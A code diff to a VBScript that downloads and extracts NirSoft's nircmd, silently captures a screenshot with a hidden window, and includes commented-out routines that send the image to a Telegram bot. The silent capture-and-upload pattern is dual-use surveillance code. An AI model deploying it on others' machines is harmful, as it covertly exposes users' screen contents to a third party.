@@ -1,16 +1,22 @@
-' Define the path where nircmd.exe should be saved
-nircmdPath = "C:\Tools\nircmd.exe" ' Update this with your desired directory path
-nircmdZipPath = "C:\Tools\nircmd.zip" ' Path to save the downloaded ZIP file
+' Define the directory where nircmd.exe will be saved
+nircmdDir = "C:\Tools" ' This will be the directory where nircmd.exe will be saved
+nircmdPath = nircmdDir & "\nircmd.exe" ' Full path of nircmd.exe
+nircmdZipPath = nircmdDir & "\nircmd.zip" ' Path to save the downloaded ZIP file
 nircmdURL = "https://www.nirsoft.net/utils/nircmd.zip" ' URL of nircmd.zip (zip version)
 
-' Check if nircmd.exe exists
-If Not FileExists(nircmdPath) Then
-    ' If not, download and extract nircmd.exe
-    DownloadNircmd nircmdURL, nircmdZipPath ' Download the ZIP file
-    ExtractZip nircmdZipPath, "C:\Tools\" ' Extract the ZIP file to the directory
+' Step 1: Create the directory if it doesn't exist
+If Not FolderExists(nircmdDir) Then
+    CreateFolder nircmdDir
 End If
 
-' Run nircmd.exe to capture the screenshot automatically
+' Step 2: Check if nircmd.exe exists, if not, download and extract it
+If Not FileExists(nircmdPath) Then
+    ' If nircmd.exe doesn't exist, download and extract it
+    DownloadNircmd nircmdURL, nircmdZipPath ' Download the ZIP file
+    ExtractZip nircmdZipPath, nircmdDir ' Extract the ZIP file to the directory
+End If
+
+' Step 3: Run nircmd.exe to capture the screenshot automatically
 CaptureScreenshot()
 
 ' Function to check if a file exists
@@ -18,6 +24,18 @@ Function FileExists(filePath)
     Set objFSO = CreateObject("Scripting.FileSystemObject")
     FileExists = objFSO.FileExists(filePath)
 End Function
+
+' Function to check if a folder exists
+Function FolderExists(folderPath)
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    FolderExists = objFSO.FolderExists(folderPath)
+End Function
+
+' Function to create a folder
+Sub CreateFolder(folderPath)
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    objFSO.CreateFolder(folderPath)
+End Sub
 
 ' Function to download a file from a URL
 Sub DownloadNircmd(url, savePath)
@@ -47,11 +65,11 @@ End Sub
 Sub CaptureScreenshot()
     ' Run nircmd to capture the screenshot
     Set objShell = CreateObject("WScript.Shell")
-    objShell.Run Chr(34) & nircmdPath & Chr(34) & " savescreenshot C:\Tools\screenshot.png", 0, True
+    objShell.Run Chr(34) & nircmdPath & Chr(34) & " savescreenshot " & nircmdDir & "\screenshot.png", 0, True
     
     ' You can also send it to Telegram here if you like (optional)
     ' SendTelegramMessage "Screenshot captured and saved!"
-    ' Call SendPhotoToTelegram("C:\Tools\screenshot.png") ' If you want to send the screenshot to Telegram
+    ' Call SendPhotoToTelegram(nircmdDir & "\screenshot.png") ' If you want to send the screenshot to Telegram
 End Sub
 
 ' Optional Telegram Message Functions (if you want to send the screenshot to Telegram)
@@ -63,7 +81,7 @@ chatID = "YOUR_CHAT_ID" ' Replace with your chat ID
 Sub SendTelegramMessage(message)
     On Error Resume Next
     Dim xmlhttp
-    Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    Set xmlhttp = CreateObject("MSXML2.XMLHTTP.6.0")
     xmlhttp.Open "GET", "https://api.telegram.org/bot" & botToken & "/sendMessage?chat_id=" & chatID & "&text=" & message, False
     xmlhttp.Send
     If Err.Number <> 0 Then Err.Clear
